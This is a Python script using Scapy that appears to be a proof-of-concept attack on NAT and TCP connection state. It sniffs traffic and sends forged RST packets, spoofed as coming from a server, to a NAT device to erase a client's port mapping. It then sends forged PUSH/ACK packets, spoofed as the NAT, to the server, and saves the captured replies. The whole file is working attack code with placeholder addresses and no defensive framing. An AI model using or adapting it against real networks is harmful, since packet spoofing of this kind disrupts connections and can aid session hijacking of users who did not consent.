#!/usr/bin/env python3

from scapy.all import *
import random
import time

# ======= CONFIGURATION =======
nat_ip = "6.6.6.6"       # NAT device's public IP address
client_ip = "192.168.0.100"  # Internal client IP (behind NAT)
server_ip = "8.8.8.8"     # Target server IP

server_dst_port = 443     # e.g., HTTPS
client_src_port = 55555   # ephemeral port NAT device mapped for client
iface = "eth0"            # network interface to use

# Random sequence/ack numbers
def rand_seq():
    return random.randint(0, 0xFFFFFFFF)

# ======= SNIFFER CALLBACK =======
def packet_callback(pkt):
    if IP in pkt and TCP in pkt:
        print(f"[+] Captured Packet: {pkt.summary()}")
        pkt.show()

# ======= START SNIFFING =======
print("[*] Starting packet capture...")
sniffer = AsyncSniffer(iface=iface, filter=f"tcp and (host {server_ip} or host {nat_ip})", prn=packet_callback, store=True)
sniffer.start()
time.sleep(2)  # give sniffer time to start

# ======= STAGE 1: Removing NAT Mapping =======
print("[*] Sending crafted RST packets to NAT device...")

rst_pkt = IP(src=server_ip, dst=nat_ip) / \
          TCP(sport=server_dst_port, dport=client_src_port, flags="RA", seq=rand_seq())

# send multiple times to increase chance of NAT mapping removal
send(rst_pkt, count=5, inter=0.2)

# ======= STAGE 2: Manipulating TCP States =======
print("[*] Sending crafted PUSH/ACK packets to server...")

push_ack_pkt = IP(src=nat_ip, dst=server_ip) / \
                TCP(sport=client_src_port, dport=server_dst_port, flags="PA", seq=rand_seq(), ack=rand_seq())

send(push_ack_pkt, count=5, inter=0.2)

# ======= WAIT & STOP SNIFFER =======
print("[*] Waiting for responses...")
time.sleep(5)

sniffer.stop()
print("[*] Sniffing completed.")

# Save captured packets for offline analysis
wrpcap("captured_packets.pcap", sniffer.results)
print("[+] Packets saved to captured_packets.pcap")
